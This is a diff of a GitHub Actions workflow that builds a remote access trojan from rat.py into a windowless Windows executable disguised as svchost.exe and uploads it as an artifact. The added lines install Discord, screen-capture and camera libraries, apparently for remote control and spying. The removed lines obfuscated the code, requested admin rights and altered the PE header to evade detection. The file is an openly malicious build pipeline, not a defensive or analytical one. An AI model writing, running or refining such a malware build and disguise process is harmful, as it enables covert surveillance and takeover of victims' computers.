@@ -1,4 +1,4 @@
-name: Build Protected RAT
+name: Build RAT
 on: [push]
 
 jobs:
@@ -6,39 +6,19 @@ jobs:
     runs-on: windows-latest
     steps:
       - uses: actions/checkout@v4
-      
       - uses: actions/setup-python@v5
         with:
           python-version: '3.11'
       
-      - name: Установка
+      - name: Install
         run: |
-          pip install pyinstaller
-          pip install pyarmor
-          pip install pycryptodome
-          pip install discord.py
+          pip install pyinstaller discord.py pyautogui opencv-python
       
-      - name: Обфускация (максимальная)
+      - name: Compile
         run: |
-          pyarmor obfuscate --restrict=0 --recursive --obf-code=1 --wrap-mode=0 rat.py
-          
-      - name: Компиляция с UPX сжатием
-        run: |
-          pyinstaller --onefile --noconsole --name svchost --strip --uac-admin --noupx rat.py
-          
-      - name: Шифрование секций
-        run: |
-          python -c "
-          import struct
-          with open('dist/svchost.exe', 'r+b') as f:
-              # Изменяем заголовок PE для защиты
-              f.seek(0x3C)
-              pe_offset = struct.unpack('<I', f.read(4))[0]
-              f.seek(pe_offset + 16)
-              f.write(b'\x02\x01\x80\x00')  # Изменяем характеристики
-          "
+          pyinstaller --onefile --noconsole --name svchost rat.py
       
       - uses: actions/upload-artifact@v4
         with:
-          name: svchost_protected
+          name: svchost
           path: dist/svchost.exe
